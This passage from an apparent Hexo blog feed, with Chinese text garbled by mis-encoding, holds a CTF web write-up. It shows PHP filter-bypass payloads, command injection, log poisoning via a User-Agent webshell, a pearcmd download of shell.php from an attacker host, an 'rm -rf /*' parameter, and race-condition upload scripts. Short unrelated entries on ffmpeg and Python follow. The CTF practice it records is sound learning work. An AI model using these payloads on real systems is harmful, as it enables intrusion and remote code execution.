<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=999%2B1</span><br><span class="line">+ç”¨urlencode-&gt;%2B</span><br><span class="line">?id=10 or id=1000#ä»sqlè¯­å¥å…¥æ‰‹</span><br></pre></td></tr></table></figure>

<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>å’Œä¸Šä¸€é¢˜æ¯”åªå¤šäº†ä¸ª</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&quot;/or|\+/i&quot;,$id))</span><br></pre></td></tr></table></figure>

<p>åªè¦ä¸å‡ºç°oræˆ–è€…+å°±å¯ä»¥äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=100*10</span><br><span class="line">?id=10||id=1000#ä»sqlè¯­å¥å…¥æ‰‹</span><br></pre></td></tr></table></figure>

<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>ä¿®æ”¹äº†åŒ¹é…è§„åˆ™</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_match(&quot;/or|\-|\\|\*|\&lt;|\&gt;|\!|x|hex|\+/i&quot;,$id)</span><br></pre></td></tr></table></figure>

<p>intvalå¦‚æœè½¬æ¢å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œå…ˆåˆ¤æ–­æ˜¯å¦ä»¥æ•°å­—å¼€å¤´ã€‚å½“ä¼ å…¥â€™1000â€™æ—¶ï¼Œä»¥â€™å¼€å¤´ï¼Œç›´æ¥è¿”å›0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&#x27;1000&#x27;</span><br><span class="line">$b=$_GET[&#x27;b&#x27;]</span><br><span class="line">å½“ä¼ å…¥?b=&#x27;1000&#x27;æ—¶,åˆ†åˆ«var_dump $aå’Œ$b,è¿”å›çš„ç»“æœä¸ä¸€æ ·</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;1000&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_match(&quot;/or|\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i&quot;,$id)</span><br></pre></td></tr></table></figure>

<p>è¿˜æ˜¯web3çš„åŸåˆ™ï¼Œåˆ©ç”¨å–åç¬¦å·ï¼Œintvalé‡åˆ°~ä¼šåˆ¤æ–­ä¸ºå­—ç¬¦ä¸²ï¼Œå¾—åˆ°0ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=~~1000</span><br></pre></td></tr></table></figure>

<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_match(&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i&quot;, $id)</span><br></pre></td></tr></table></figure>

<p>ç»§ç»­å–å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=~~1000</span><br></pre></td></tr></table></figure>

<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_match(&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|x|hex|\(|\)|\+|select/i&quot;,$id)</span><br></pre></td></tr></table></figure>

<p>ç»§ç»­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=~~1000</span><br></pre></td></tr></table></figure>

<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_match(&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i&quot;,$id)</span><br></pre></td></tr></table></figure>

<p>intvalé»˜è®¤ç»™çš„baseæ˜¯10ï¼Œå½“baseç»™åˆ°0çš„æ—¶å€™ï¼Œæ‰ä¼šæ ¹æ®ä¼ å…¥çš„å€¼åŠ¨æ€åˆ¤æ–­baseã€‚base10è§£æä¹‹åçš„0b1111101000åº”è¯¥æ˜¯int(0)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0b1111101000</span><br></pre></td></tr></table></figure>

<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># åŒ…å«æ•°æ®åº“è¿æ¥æ–‡ä»¶,key flag ä¹Ÿåœ¨é‡Œé¢å®šä¹‰</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"># åˆ¤æ–­getæäº¤çš„å‚æ•°idæ˜¯å¦å­˜åœ¨</span><br><span class="line">if(isset($_GET[&#x27;flag&#x27;]))&#123;</span><br><span class="line">        if(isset($_GET[&#x27;flag&#x27;]))&#123;</span><br><span class="line">                $f = $_GET[&#x27;flag&#x27;];</span><br><span class="line">                if($key===$f)&#123;</span><br><span class="line">                        echo $flag;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>å‚»é€¼é¢˜</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?flag=rm -rf /*</span><br></pre></td></tr></table></figure>

<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">        if(preg_match(&quot;/system|exec|highlight/i&quot;,$c))&#123;</span><br><span class="line">                eval($c);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;cmd error&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‚»é€¼äº†ï¼Œä»¥ä¸ºçœ‹çš„æ˜¯!preg_matchï¼Œæœ€å¼€å§‹ç”¨çš„php:&#x2F;&#x2F;inputä¼ªåè®®ç»•è¿‡</p>
<p>ç»“æœè¿™ä¹ˆç®€å•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&#x27;cat config&#x27;|base64)</span><br></pre></td></tr></table></figure>

<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/system|exec|highlight/i&quot;,$c))</span><br></pre></td></tr></table></figure>

<p>æ¢ç”¨passthru()å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&#x27;cat config.php|base64&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/system|exec|highlight|cat/i&quot;,$c))</span><br></pre></td></tr></table></figure>

<p>passthru+tac</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&#x27;tac config.php|base64&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/system|exec|highlight|cat|\.|php|config/i&quot;,$c))</span><br></pre></td></tr></table></figure>

<p>ç¦æ­¢çš„å­—ç¬¦æ–°å¢äº†. php config</p>
<p>è€ƒè™‘ä½¿ç”¨é€šé…ç¬¦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&#x27;tac c*|base64&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/system|exec|highlight|cat|\.|\;|file|php|config/i&quot;,$c))</span><br></pre></td></tr></table></figure>

<p>äºè´¼ï¼Œ<code>?&gt;</code>èƒ½ä»£æ›¿<code>;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&#x27;tac c*|base64&#x27;)?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/system|exec|highlight|cat|\(|\.|\;|file|php|config/i&quot;,$c))</span><br></pre></td></tr></table></figure>

<p>å¤šåŠ äº†ä¸ª(ï¼Œå…¶å®è¿˜æŒºä½èƒ½çš„ï¼Œåœ¨ä¸Šé¢ä¹Ÿèƒ½ç”¨ç»Ÿä¸€æ–¹æ³•ç›´æ¥echoå‡ºæ¥</p>
<p>å°±æ˜¯éœ€è¦æŠŠ;æ¢æˆ?&gt;</p>
<p>å‚è€ƒ</p>
<blockquote>
<p>ä»£ç ä¸èƒ½åŒ…å«æ‰“å¼€&#x2F;å…³é—­ <a href="https://www.php.net/manual/zh/language.basic-syntax.phpmode.php">PHP tags</a>ã€‚æ¯”å¦‚ï¼Œ <code>&#39;echo &quot;Hi!&quot;;&#39;</code> ä¸èƒ½è¿™æ ·ä¼ å…¥ï¼š <code>&#39;&lt;?php echo &quot;Hi!&quot;; ?&gt;&#39;</code>ã€‚ä½†ä»ç„¶å¯ä»¥ç”¨åˆé€‚çš„ PHP tag æ¥ç¦»å¼€ã€é‡æ–°è¿›å…¥ PHP æ¨¡å¼ã€‚æ¯”å¦‚ <code>&#39;echo &quot;In PHP mode!&quot;; ?&gt;In HTML mode!&lt;?php echo &quot;Back in PHP mode!&quot;;&#39;</code>ã€‚</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo $flag?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/system|\\*|\?|\&lt;|\&gt;|\=|exec|highlight|cat|\(|\.|file|php|config/i&quot;,$c))</span><br></pre></td></tr></table></figure>

<p>æŠŠ&lt;&gt;?å…¨è¿‡æ»¤äº†ï¼Œæ²¡å‘ç¦»å¼€phpæ¨¡å¼ï¼Œä½†æ²¡ç¦ç”¨;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo $flag;</span><br></pre></td></tr></table></figure>

<h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(md5(&quot;ctfshow$c&quot;)===&quot;a6f57ae38a22448c2f07f3f95f49c84e&quot;)</span><br></pre></td></tr></table></figure>

<p>è„‘æ®‹ï¼Œmd5é€†å‘ä¹‹åæ˜¯ctfshow36d</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=36d</span><br></pre></td></tr></table></figure>

<h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/php/i&quot;,$c))&#123;</span><br><span class="line">               include($c);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°includeï¼Œç¬¬ä¸€æ—¶é—´æƒ³çš„ä¼ªåè®®ã€‚æ¢ç”¨äº†dataä¹Ÿå› ä¸ºè¢«ç¦ç”¨æ²¡æœ‰æˆåŠŸ</p>
<p><code>data:// wrapper is disabled in the server configuration by allow_url_include=0</code></p>
<p>çœ‹äº†wpæ‰çŸ¥é“ï¼Œåªæ˜¯åŒ…å«æ—¥å¿—</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡æ—¥å¿—çœ‹å¾—å‡ºæ¥ä¼šè®°å½•UA</p>
<p>é‚£å°±ä¿®æ”¹UAä¸ºä¸€å¥è¯æœ¨é©¬</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309181325686.png" alt="image-20230918132518605"></p>
<p>ç„¶åè®¿é—®å¸¦ç€ä¸€å¥è¯æœ¨é©¬çš„UAè®¿é—®ä¸€éç½‘ç«™ï¼Œç­‰å†™è¿›å»å†æ‰“ä¸€é</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/var/log/nginx/access.log</span><br><span class="line">test=system(&#x27;cat 36d.php|base64&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p>åªåœ¨$_GET[â€˜câ€™]é‡Œå¤šåŠ å…¥äº†å¯¹fileçš„è¿‡æ»¤ï¼ŒåŒä¸Šâ†‘</p>
<h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/php|file|base/i&quot;,$c))</span><br></pre></td></tr></table></figure>

<p>åŒç†</p>
<h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/php|file|base|rot/i&quot;,$c))</span><br></pre></td></tr></table></figure>

<p>åŒç†</p>
<h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/php|file|\:|base|rot/i&quot;,$c))</span><br></pre></td></tr></table></figure>

<p>åŒä¸Š</p>
<h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/\:|\/|\\\/i&quot;,$c))</span><br></pre></td></tr></table></figure>

<p>äºè´¼ï¼Œéš¾åº¦ä¸€ä¸‹ä¸Šæ¥äº†ï¼Œå®Œå…¨æ²¡æœ‰æ€è·¯</p>
<p><a href="https://blog.csdn.net/qq_46091464/article/details/108954166">https://blog.csdn.net/qq_46091464/article/details/108954166</a></p>
<blockquote>
<p>â€˜<a href="https://www.php.net/manual/zh/reserved.variables.argv.php">argv</a>â€˜</p>
<p>ä¼ é€’ç»™è¯¥è„šæœ¬çš„å‚æ•°çš„æ•°ç»„ã€‚å½“è„šæœ¬ä»¥å‘½ä»¤è¡Œæ–¹å¼è¿è¡Œæ—¶ï¼Œargv å˜é‡ä¼ é€’ç»™ç¨‹åº C è¯­è¨€æ ·å¼çš„å‘½ä»¤è¡Œå‚æ•°ã€‚å½“é€šè¿‡ GET æ–¹å¼è°ƒç”¨æ—¶ï¼Œè¯¥å˜é‡åŒ…å«query stringã€‚</p>
<p>â€˜<a href="https://www.php.net/manual/zh/reserved.variables.argc.php">argc</a>â€˜</p>
<p>åŒ…å«å‘½ä»¤è¡Œæ¨¡å¼ä¸‹ä¼ é€’ç»™è¯¥è„šæœ¬çš„å‚æ•°çš„æ•°ç›®(å¦‚æœè¿è¡Œåœ¨å‘½ä»¤è¡Œæ¨¡å¼ä¸‹)ã€‚</p>
</blockquote>
<p>å½“æ­£å¸¸ä¼ å…¥?c&#x3D;xxx&amp;b&#x3D;xxæ—¶ï¼Œ$_SERVER[â€˜argcâ€™]çš„å€¼å§‹ç»ˆæ˜¯1</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309181651302.png" alt="image-20230918165121242"></p>
<p>ä½†æ˜¯ç•¥åŠ ä¿®æ”¹ï¼Œ?c&#x3D;xxx&amp;+b&#x3D;xxæ—¶ï¼Œå°±å˜æˆäº†2ã€‚</p>
<p>è€Œç¯å¢ƒå†…æå…¶å‚»é€¼çš„è¿˜æœ‰ä¸€ä¸ªpearcmd.phpï¼Œpearcmdæœ‰ä¸€ä¸ªdownloadåŠŸèƒ½å¯ä»¥ä»å¤–éƒ¨ä¸‹è½½phpæ–‡ä»¶</p>
<p>é‚£å°±æ˜¯åŒ…å«äº†pearcmd.phpï¼Œç„¶åé€šè¿‡+åˆ†éš”ï¼Œæ‰§è¡Œdownloadå‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ”»å‡»æœº:</span><br><span class="line">echo &quot;&lt;?php system(&#x27;cat 3*|base64&#x27;);?&gt;&quot;&gt;shell.php</span><br><span class="line">python3 -m http.server 81</span><br><span class="line">é¶æœº:</span><br><span class="line">?c=pearcmd&amp;+download+http://ip:81/shell.php</span><br><span class="line">/shell.php</span><br></pre></td></tr></table></figure>

<h2 id="è·å¾—ç™¾åˆ†ä¹‹ç™¾çš„å¿«ä¹"><a href="#è·å¾—ç™¾åˆ†ä¹‹ç™¾çš„å¿«ä¹" class="headerlink" title="è·å¾—ç™¾åˆ†ä¹‹ç™¾çš„å¿«ä¹"></a>è·å¾—ç™¾åˆ†ä¹‹ç™¾çš„å¿«ä¹</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(strlen($_GET[1])&lt;4)&#123;</span><br><span class="line">     echo shell_exec($_GET[1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¦æ±‚ä¼ å…¥1çš„é•¿åº¦&lt;4ï¼Œå¤ªç‰›é€¼äº†</p>
<p>ç›´æ¥è·‘ä¸ªlsï¼Œå‘ç°åå­—éƒ½å¾ˆé å</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309181755031.png" alt="image-20230918175530980"></p>
<p>tip:åœ¨linuxä¸Šï¼Œç›´æ¥æ‰§è¡Œ&gt;nameå¯ä»¥åˆ›å»ºä¸€ä¸ªåä¸ºnameçš„æ–‡ä»¶å¹¶å¾€é‡Œå†™ä¸œè¥¿</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309181757349.png" alt="image-20230918175716313"></p>
<blockquote>
<p>åœ¨Linuxçš„Shellç¯å¢ƒä¸‹ï¼Œç›´æ¥æ‰§è¡Œæ˜Ÿå·ï¼ˆ*ï¼‰é€šå¸¸ä¼šè§¦å‘é€šé…ç¬¦å±•å¼€ï¼ˆWildcard Expansionï¼‰æ“ä½œï¼Œå…¶æ•ˆæœæ˜¯åŒ¹é…å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•ï¼ˆé™¤äº†ä»¥ç‚¹å¼€å¤´çš„éšè—æ–‡ä»¶å’Œéšè—ç›®å½•ï¼‰å¹¶å°†å®ƒä»¬ä½œä¸ºå‚æ•°ä¼ é€’ç»™ç›¸åº”çš„å‘½ä»¤ã€‚è¿™æ˜¯å› ä¸ºæ˜Ÿå·ï¼ˆ*ï¼‰æ˜¯é€šé…ç¬¦ï¼Œç”¨äºåŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚</p>
</blockquote>
<p>ç›´æ¥è¾“*ä¼šæŠŠå½“å‰æ–‡ä»¶å¤¹ä¸‹çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶åä½œä¸ºå‘½ä»¤ï¼Œå‰©ä½™çš„æ–‡ä»¶åä½œä¸ºå‚æ•°</p>
<p>å¦‚æœå½“å‰æ–‡ä»¶å¤¹ä¸‹æœ‰æ–‡ä»¶ï¼šcatï¼Œtestã€‚æ‰§è¡Œ*çš„æ•ˆæœç­‰ä»·äºcat test</p>
<p>é™¤äº†catï¼Œè¿˜æœ‰nlè¿™ä¸ªå‘½ä»¤åŒæ ·å¯ä»¥ç”¨æ¥æ˜¾ç¤ºå†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?1=&gt;nl</span><br><span class="line">?1=*</span><br></pre></td></tr></table></figure>



<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><p>ç¬¬ä¸€æ¬¡é‡åˆ°ç«äº‰ä¸Šä¼ ï¼Œå­¦ä¹ ä¸€ä¸‹</p>
<p>å…¶å®æ¯æ¬¡ä¸Šä¼ æˆåŠŸä¹‹åéƒ½è¦ç­‰ä¸€ä¸‹å°±è¯¥æ„è¯†åˆ°æœ‰ä¸ªsleepç„¶åæƒ³åˆ°ç«äº‰ä¸Šä¼ çš„</p>
<p>æºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$new_filename = date(&#x27;YmdHis&#x27;,time()).rand(100,1000).&#x27;.&#x27;.$ext_suffix;</span><br><span class="line">if (move_uploaded_file($temp_name, &#x27;uploads/&#x27;.$new_filename))&#123;</span><br><span class="line">	echo &quot;uploads/$new_filename&quot;;</span><br><span class="line">	sleep(1);</span><br><span class="line">	system(&quot;rm -rf ./uploads/*.php&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ‰çˆ†ç ´è„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># coding: utf-8</span><br><span class="line"># Auth: y2hlbmc</span><br><span class="line"> </span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"> </span><br><span class="line">url = &quot;http://0d33429a-38e4-4c4e-8d57-16fca7d5eab1.challenge.ctf.show/&quot;</span><br><span class="line"> </span><br><span class="line">def Thread(fun,*args):</span><br><span class="line">    return threading.Thread(target=fun, args=args)</span><br><span class="line"> </span><br><span class="line">def req(fname):</span><br><span class="line">    r = requests.get(url + &quot;uploads/&quot; + fname + &quot;.php&quot;)</span><br><span class="line">    x = r.text</span><br><span class="line">    if len(x) &gt; 0 and &quot;404 Not Found&quot; not in x and &quot;å®¹å™¨å·²è¿‡æœŸ&quot; not in x:</span><br><span class="line">        print(x)</span><br><span class="line"> </span><br><span class="line">def Thread_start(fname):</span><br><span class="line">    for i in range(100,400):</span><br><span class="line">        # æ¯ä¸ªæ–‡ä»¶åå•èµ·ä¸€ä¸ªçº¿ç¨‹</span><br><span class="line">        Thread(req, fname + str(i)).start()</span><br><span class="line"> </span><br><span class="line">def upload():</span><br><span class="line">    while True:</span><br><span class="line">    	# æŒ‡å®šæ¯æ¬¡ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹</span><br><span class="line">        file_data = &#123;&#x27;file&#x27;:(&#x27;shell.php&#x27;,&quot;&lt;?php system(\&quot;ls -l ../\&quot;);?&gt;&quot;.encode())&#125;</span><br><span class="line">        r = requests.post(url + &quot;upload.php&quot;,files=file_data)</span><br><span class="line">        txt = r.text</span><br><span class="line">        print(&quot;uploaded:&quot;,txt)</span><br><span class="line">        # ç”¨æœ¬æ¬¡çš„æ–‡ä»¶åæ¨ç®—ä¸‹ä¸€æ¬¡çš„æ–‡ä»¶åï¼Œç›¸å·®sleepä¸€æ¬¡çš„æ—¶é—´é—´éš”</span><br><span class="line">        ts = int(time.mktime(time.strptime(txt[8:22], &quot;%Y%m%d%H%M%S&quot;)))</span><br><span class="line">        fname = time.strftime(&quot;%Y%m%d%H%M%S&quot;, time.localtime(ts + 1))</span><br><span class="line">        # å•èµ·ä¸€ä¸ªçº¿ç¨‹ï¼Œçˆ†ç ´ä¸‹ä¸€æ¬¡uploadçš„æ–‡ä»¶å</span><br><span class="line">        Thread(Thread_start, fname).start()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    upload()</span><br></pre></td></tr></table></figure>

<p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨bp+pythonä¸€èµ·çˆ†</p>
<p>å…·ä½“æ€è·¯æ˜¯bpç”¨instruderä¸€ç›´å‘é€ä¸Šä¼ åŒ…</p>
<p>pythonç”¨å½“å‰æ—¶é—´+range+threadä¸€ç›´çˆ†</p>
<p>å¦‚æœä¸é‡‡ç”¨æ¨ç®—æ–‡ä»¶åå’Œå¤šçº¿ç¨‹çš„æ–¹æ³•ï¼Œæƒ³è¦åœ¨æ¥å›æ—¶å»¶ä¸‹åšåˆ°1så†…è®¿é—®åˆ°æ˜¯éå¸¸å›°éš¾çš„ï¼Œæ‰€ä»¥ä¸‹é¢ä»£ç çš„æˆåŠŸç‡æä½</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_data = &#123;&#x27;file&#x27;: (&#x27;shell.php&#x27;, &quot;&lt;?php system(\&quot;ls -l ../\&quot;);?&gt;&quot;.encode())&#125;</span><br><span class="line">r = requests.post(url + &quot;upload.php&quot;, files = file_data)</span><br><span class="line">txt = r.text</span><br><span class="line"># print(&quot;uploaded:&quot;, txt)</span><br><span class="line">r = requests.get(url + &quot;uploads/&quot; + txt)</span><br><span class="line">x = r.text</span><br><span class="line">if len(x) &gt; 0 and &quot;404 Not Found&quot; not in x and &quot;å®¹å™¨å·²è¿‡æœŸ&quot; not in x:</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>

<h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><p>ä¸€æ ·æ˜¯ç«äº‰ä¸Šä¼ çš„é¢˜ç›®ï¼ŒæŠŠrangeå‡å°‘ï¼Œæ—¶é—´å¢åŠ äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># coding: utf-8</span><br><span class="line"># Auth: y2hlbmc</span><br><span class="line"> </span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"> </span><br><span class="line">url = &quot;http://aa167920-a54b-498c-bf8e-877615061128.challenge.ctf.show/&quot;</span><br><span class="line"> </span><br><span class="line">def Thread(fun,*args):</span><br><span class="line">    return threading.Thread(target=fun, args=args)</span><br><span class="line"> </span><br><span class="line">def req(fname):</span><br><span class="line">    r = requests.get(url + &quot;uploads/&quot; + fname + &quot;.php&quot;)</span><br><span class="line">    x = r.text</span><br><span class="line">    if len(x) &gt; 0 and &quot;404 Not Found&quot; not in x and &quot;å®¹å™¨å·²è¿‡æœŸ&quot; not in x:</span><br><span class="line">        print(x)</span><br><span class="line"> </span><br><span class="line">def Thread_start(fname):</span><br><span class="line">    for i in range(100,300):</span><br><span class="line">        # æ¯ä¸ªæ–‡ä»¶åå•èµ·ä¸€ä¸ªçº¿ç¨‹</span><br><span class="line">        Thread(req, fname + str(i)).start()</span><br><span class="line"> </span><br><span class="line">def upload():</span><br><span class="line">    while True:</span><br><span class="line">    	# æŒ‡å®šæ¯æ¬¡ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹</span><br><span class="line">        file_data = &#123;&#x27;file&#x27;:(&#x27;shell.php&#x27;,&quot;&lt;?php system(\&quot;ls -l ../\&quot;);?&gt;&quot;.encode())&#125;</span><br><span class="line">        r = requests.post(url + &quot;upload.php&quot;,files=file_data)</span><br><span class="line">        txt = r.text</span><br><span class="line">        print(&quot;uploaded:&quot;,txt)</span><br><span class="line">        # ç”¨æœ¬æ¬¡çš„æ–‡ä»¶åæ¨ç®—ä¸‹ä¸€æ¬¡çš„æ–‡ä»¶åï¼Œç›¸å·®sleepä¸€æ¬¡çš„æ—¶é—´é—´éš”</span><br><span class="line">        ts = int(time.mktime(time.strptime(txt[8:22], &quot;%Y%m%d%H%M%S&quot;)))</span><br><span class="line">        fname = time.strftime(&quot;%Y%m%d%H%M%S&quot;, time.localtime(ts + 3))</span><br><span class="line">        # å•èµ·ä¸€ä¸ªçº¿ç¨‹ï¼Œçˆ†ç ´ä¸‹ä¸€æ¬¡uploadçš„æ–‡ä»¶å</span><br><span class="line">        Thread(Thread_start, fname).start()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    upload()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>é¢˜è§£</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>flv2mp4</title>
    <url>/2022/11/21/flv2mp4/</url>
    <content><![CDATA[<p>å€ŸåŠ©FFmpegæŠŠflvå°è£…ä¸ºmp4æ–‡ä»¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202211101629273.png" alt="202211101629273.png"></p>
<p>æ•ˆæœå¦‚ä¸‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202211101629263.png" alt="202211101629263.png"></p>
<p>ç›¸æ¯”å…¶ä»–çš„è½¬ç ï¼Œé€Ÿåº¦æ›´å¿«æ›´å¥½</p>
]]></content>
      <categories>
        <category>æ€ªä¸œè¥¿</category>
      </categories>
      <tags>
        <tag>å…¶ä»–</tag>
      </tags>
  </entry>
  <entry>
    <title>pythonå…¥é—¨</title>
    <url>/2022/11/21/python%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h3 id="level0ï¼š"><a href="#level0ï¼š" class="headerlink" title="level0ï¼š"></a>level0ï¼š</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211021357361.png" alt="0"></p>
<p>ä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hallo world!&quot;</span>)</span><br></pre></td></tr></table></figure>

